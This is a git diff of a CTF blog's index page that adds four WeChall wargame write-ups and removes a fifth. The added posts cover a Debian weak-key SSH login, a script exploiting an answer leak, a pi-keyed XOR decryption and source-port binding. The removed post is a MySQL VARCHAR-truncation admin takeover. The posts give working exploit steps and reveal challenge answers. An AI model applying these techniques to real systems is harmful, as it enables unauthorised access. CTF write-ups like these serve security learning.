@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">333</span>
+          <span class="site-state-item-count">337</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">205</span>
+        <span class="site-state-item-count">206</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,461 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-ssh-z-is-sleeping/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-ssh-z-is-sleeping/" class="post-title-link" itemprop="url">WeChall - SSH... Z is sleeping</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-14 13:10:30 / Modified: 13:10:31" itemprop="dateCreated datePublished" datetime="2026-06-14T13:10:30+08:00">2026-06-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-ssh-z-is-sleeping/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-ssh-z-is-sleeping/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Warchall level8：Z 睡着了，SSH key 暴露在
+<code>/home/level/08_sshz/backups/</code>。目标是找到对应私钥，以
+<code>level08</code> 登录。</p>
+<h3 id="solution">Solution</h3>
+<p>这题利用 Debian OpenSSL 弱密钥漏洞（2008 年 CVE-2008-0166）。Debian
+的 OpenSSL 包因注释掉 <code>md_rand.c</code> 中两行
+<code>MD_Update(&amp;m,buf,j)</code>，导致 PRNG 仅以进程 PID
+作为随机种子，可能的密钥只有 32768 种。</p>
+<p><strong>Step 1: 获取 public key</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 Warchall 服务器读取公钥</span></span><br><span class="line">$ <span class="built_in">cat</span> /home/level/08_sshz/backups/authorized_keys.backup</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLbM20VLy+Bf7fjHk...</span><br></pre></td></tr></table></figure>
+<p><strong>Step 2: 计算 MD5 fingerprint</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -l -E md5 -f authorized_keys.backup</span><br><span class="line">2048 MD5:2b:<span class="built_in">cd</span>:07:a7:01:e9:4a:04:74:d7:7e:e4:d6:d0:f8:06 ...</span><br></pre></td></tr></table></figure>
+<p><strong>Step 3: 在 Debian weak key 集中匹配</strong></p>
+<p>下载已知弱密钥集合。原 ANSSI-FR 仓库已被删除，可使用 g0tmi1k
+维护的镜像：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆镜像（如已有关键集合可跳过）</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/g0tmi1k/debian-ssh</span><br><span class="line">$ <span class="built_in">cd</span> debian-ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压 RSA 2048 位 SSH 密钥</span></span><br><span class="line">$ tar -xjf common_keys/debian_ssh_rsa_2048_x86.tar.bz2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉冒号搜索指纹文件名</span></span><br><span class="line">$ find rsa/ -name <span class="string">&#x27;*2bcd07a701e94a0474d77ee4d6d0f806*&#x27;</span></span><br><span class="line">rsa/2048/2bcd07a701e94a0474d77ee4d6d0f806-23669</span><br></pre></td></tr></table></figure>
+<p>指纹对应 PID 23669 的 RSA 2048 位密钥。</p>
+<p><strong>说明：</strong> 该 key set 的文件名格式为
+<code>&lt;fingerprint_hex&gt;-&lt;PID&gt;</code>，因此直接
+<code>find</code> 匹配指纹（去除冒号）即可定位，无需逐 key 计算。</p>
+<p><strong>Step 4: SSH 登录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i rsa/2048/2bcd07a701e94a0474d77ee4d6d0f806-23669 \</span><br><span class="line">    level08@warchall.net -p 19198</span><br></pre></td></tr></table></figure>
+<p>注意：用户是 <code>level08</code>，不是 <code>z</code>；使用
+<code>-i</code> 指定密钥文件。端口 19198 是 Warchall SSH 服务端口。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">PrivateKeysAreGold</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-impossible-nest-pas-francais/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-impossible-nest-pas-francais/" class="post-title-link" itemprop="url">WeChall - Impossible n'est pas français</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-14 12:55:03 / Modified: 12:55:06" itemprop="dateCreated datePublished" datetime="2026-06-14T12:55:03+08:00">2026-06-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-impossible-nest-pas-francais/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-impossible-nest-pas-francais/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>题目要求将一个 170+ 位的大整数分解质因数，限时 6 秒。</p>
+<h3 id="solution">Solution</h3>
+<p>直接分解这么大的数是不现实的。但题目有一个关键缺陷：提交错误答案后，服务器会在错误信息中<strong>泄露正确的答案</strong>，并且挑战数字保持不变。</p>
+<p>所以解法分三步：</p>
+<ol type="1">
+<li>请求一个新数字</li>
+<li>提交任意错误答案（如 <code>solution=1</code>）→ 服务器返回
+<code>Correct would have been "xxx"</code></li>
+<li>用泄露的正确答案重新提交</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&#x27;WC&#x27;</span>: <span class="string">&#x27;YOUR_WECHALL_COOKIE&#x27;</span>&#125;</span><br><span class="line">base = <span class="string">&#x27;https://www.wechall.net/en/challenge/impossible/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: request new number</span></span><br><span class="line">r = requests.get(<span class="string">f&#x27;<span class="subst">&#123;base&#125;</span>?request=new_number&#x27;</span>, cookies=cookies)</span><br><span class="line">csrf = re.search(<span class="string">r&#x27;name=&quot;gwf3_csrf&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span>, r.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: submit wrong answer to leak the correct one</span></span><br><span class="line">r2 = requests.post(base, data=&#123;</span><br><span class="line">    <span class="string">&#x27;solution&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;solve&#x27;</span>: <span class="string">&#x27;Submit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gwf3_csrf&#x27;</span>: csrf</span><br><span class="line">&#125;, cookies=cookies)</span><br><span class="line">correct = re.search(<span class="string">r&#x27;Correct would have been &quot;(\d+)&quot;&#x27;</span>, r2.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: submit the correct answer</span></span><br><span class="line">r3 = requests.post(base, data=&#123;</span><br><span class="line">    <span class="string">&#x27;solution&#x27;</span>: correct,</span><br><span class="line">    <span class="string">&#x27;solve&#x27;</span>: <span class="string">&#x27;Submit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gwf3_csrf&#x27;</span>: csrf</span><br><span class="line">&#125;, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Solved!&quot;</span> <span class="keyword">if</span> <span class="string">&#x27;correct&#x27;</span> <span class="keyword">in</span> r3.text.lower() <span class="keyword">else</span> <span class="string">&quot;Failed&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-pimitive-encryption/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-pimitive-encryption/" class="post-title-link" itemprop="url">WeChall - Pimitive Encryption (Crypto, Logic)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-14 12:53:21 / Modified: 12:53:22" itemprop="dateCreated datePublished" datetime="2026-06-14T12:53:21+08:00">2026-06-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-pimitive-encryption/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-pimitive-encryption/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>题名 "Pimitive Encryption" 是 "Pi" + "Primitive" 的谐音。一个用
+One-Time Pad XOR 加密的文件，提示 key 是 "logical" 的。</p>
+<p>加密文件 116921 字节，URL 上直接下载 <code>pimitive.zip</code>。</p>
+<h3 id="solution">Solution</h3>
+<p><strong>Step 1: 确认 key = π 的十进制字符串</strong></p>
+<p>已知加密文件应为 ZIP（magic <code>PK\x03\x04</code>）。前 4 字节
+XOR：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CIPHER:  63 DF 65 CF</span><br><span class="line">ZIP:     50 4B 03 04</span><br><span class="line">KEY:     33 2E 31 34  →  &quot;3.14&quot;</span><br></pre></td></tr></table></figure>
+<p>key 是圆周率 π 的十进制展开字符串
+<code>"3.1415926535..."</code>，一次性 XOR 整个文件（不循环重复）。</p>
+<p><strong>Step 2: 生成 116921 位 π</strong></p>
+<p>方法 A（推荐）：用 pi.delivery API 分块拉取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">digits = <span class="string">&quot;3.&quot;</span></span><br><span class="line">start = <span class="number">1</span>  <span class="comment"># after decimal point</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(digits) &lt; <span class="number">116921</span>:</span><br><span class="line">    n = <span class="built_in">min</span>(<span class="number">1000</span>, <span class="number">116921</span> - <span class="built_in">len</span>(digits))</span><br><span class="line">    r = requests.get(<span class="string">f&quot;https://api.pi.delivery/v1/pi?start=<span class="subst">&#123;start&#125;</span>&amp;numberOfDigits=<span class="subst">&#123;n&#125;</span>&amp;radix=10&quot;</span>)</span><br><span class="line">    digits += r.json()[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">    start += n</span><br></pre></td></tr></table></figure>
+<p>方法 B：Chudnovsky 算法 + Python <code>decimal</code> 高精度</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">120000</span></span><br><span class="line"><span class="comment"># Chudnovsky series: π = 426880√10005 / Σ(k=0..∞) (6k)!(13591409+545140134k)/(3k)!(k!)^3(-640320)^(3k)</span></span><br><span class="line"><span class="comment"># 迭代约 8300 次收敛到 120K 位</span></span><br></pre></td></tr></table></figure>
+<p><strong>Step 3: XOR 解密</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = pi_str.encode()[:<span class="built_in">len</span>(enc)]</span><br><span class="line">dec = <span class="built_in">bytes</span>(e ^ k <span class="keyword">for</span> e, k <span class="keyword">in</span> <span class="built_in">zip</span>(enc, key))</span><br><span class="line"><span class="comment"># → 输出为有效 ZIP 文件，含 netforce33.bmp</span></span><br></pre></td></tr></table></figure>
+<p><strong>Step 4: 解压提取 BMP</strong></p>
+<p>1280×384 的 BMP 图片，内容为 "OneTimePad" 字样下方一行字。Tesseract
+OCR 或肉眼辨认：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Actually the password is: Botterbloom</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">Botterbloom</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-net-ports/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-training-net-ports/" class="post-title-link" itemprop="url">WeChall - Training - Net Ports</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-06-14 01:20:00" itemprop="dateCreated datePublished" datetime="2026-06-14T01:20:00+08:00">2026-06-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-06-13 22:04:08" itemprop="dateModified" datetime="2026-06-13T22:04:08+08:00">2026-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-training-net-ports/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-net-ports/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>题目不是考常见服务端口，而是要求 WeChall 服务器看到你的客户端源端口为
+<code>42</code>。</p>
+<p>题面里的 "remote-port" 指的是服务器视角下的 remote
+port，也就是你的本地源端口。</p>
+<h3 id="solution">Solution</h3>
+<p>用能绑定本地源端口的 HTTP 客户端访问挑战页：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl --local-port 42 \</span><br><span class="line">  -b <span class="string">&#x27;WC=YOUR_WECHALL_COOKIE&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;http://www.wechall.net/en/challenge/training/net/ports/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>Linux 默认低于 1024 的端口是 privileged port。普通用户绑定
+<code>42</code> 会失败：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl: (45) bind failed with errno 13: Permission denied</span><br></pre></td></tr></table></figure>
+<p>可选方案：</p>
+<ul>
+<li>用 <code>sudo curl --local-port 42</code>（需要 sudo 权限）</li>
+<li>给 curl 加
+<code>CAP_NET_BIND_SERVICE</code>：<code>setcap cap_net_bind_service=+ep $(which curl)</code></li>
+<li>从一台有 root 权限且直连互联网的服务器发起请求</li>
+</ul>
+<p>本题没有固定密码——连接源端口正确即自动通过。WeChall 服务器检测 TCP
+连接的 source port，无需提交任何答案表单。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1107,504 +1562,6 @@ KDBX，需用 <code>libkeepass</code>：</p>
 <h3 id="summary">Summary</h3>
 <p>完整的 Windows
 凭证盗窃链：<code>SAM+SYSTEM → NTLM hash → 密码复用 → KeePass → 敏感数据泄露 → 登录邮箱销毁证据</code>。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-screwed-signup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-screwed-signup/" class="post-title-link" itemprop="url">WeChall - Screwed Signup</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-11 17:00:23 / Modified: 17:01:30" itemprop="dateCreated datePublished" datetime="2026-06-11T17:00:23+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-screwed-signup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-screwed-signup/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Screwed Signup (Exploit, PHP) by gizmore MySQL VARCHAR 截断 +
-查询不一致导致的权限提升</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>目标是 login as Admin。题目给了 register/login
-的源码，<code>chall_sql1</code> 表中已有原始 Admin
-记录（<code>access_level=1337</code>）。</p>
-<p>关键源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册 — INSERT 语句</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT IGNORE INTO `chall_sql1` VALUES (&#x27;<span class="subst">$uname</span>&#x27;, &#x27;<span class="subst">$pw</span>&#x27;, 0)&quot;</span>;</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录校验</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">screwed_signupGetUser</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `chall_sql1` WHERE `username`=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>漏洞是 <strong>VARCHAR 截断</strong> +
-<strong>查询不一致</strong>：</p>
-<ul>
-<li>表定义 <code>username VARCHAR(24)</code>，但 PHP 的
-<code>preg_match('/^[a-z0-9A-Z ]{3,64}$/D')</code> 允许最长 <strong>64
-字符</strong></li>
-<li><code>trim()</code> 只去掉首尾空格，中间空格保留</li>
-<li>MySQL 在非严格模式下静默截断超长值到 24 字符</li>
-</ul>
-<p>利用步骤：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 注册: username = &quot;Admin&quot; + 19空格 + &quot;a&quot;    (共 25 字符)</span><br><span class="line">   → trim() 保留中间空格（a 在末尾不会被 trim 删掉）</span><br><span class="line">   → regex 通过（3-64 字符规则）</span><br><span class="line"></span><br><span class="line">2. UserExists(&quot;Admin&quot; + 19空格 + &quot;a&quot;) → false（表中无此长字符串记录）</span><br><span class="line"></span><br><span class="line">3. MySQL INSERT 时截断到 VARCHAR(24):</span><br><span class="line">   实际写入: &quot;Admin&quot; + 19 空格      (access_level=0)</span><br><span class="line"></span><br><span class="line">4. 现在表中有两条 Admin 记录：</span><br><span class="line">   - 原始 Admin (access_level=1337) ← 先插入</span><br><span class="line">   - 我们复制的 Admin (access_level=0) ← 后插入</span><br><span class="line"></span><br><span class="line">5. 登录: username = &quot;Admin&quot;（无空格）</span><br><span class="line">   → PasswordMatch 检查 username+password → 找到我们的记录（密码匹配）</span><br><span class="line">   → GetUser 只查 username → WHERE username=&#x27;Admin&#x27; → 返回第一行 → 原始 Admin</span><br><span class="line">   → access_level=1337 &gt; 0 → solved</span><br></pre></td></tr></table></figure>
-<p>关键：<strong><code>PasswordMatch</code> 检查了密码但
-<code>GetUser</code>
-只查用户名</strong>，两条查询的不一致导致权限提升。</p>
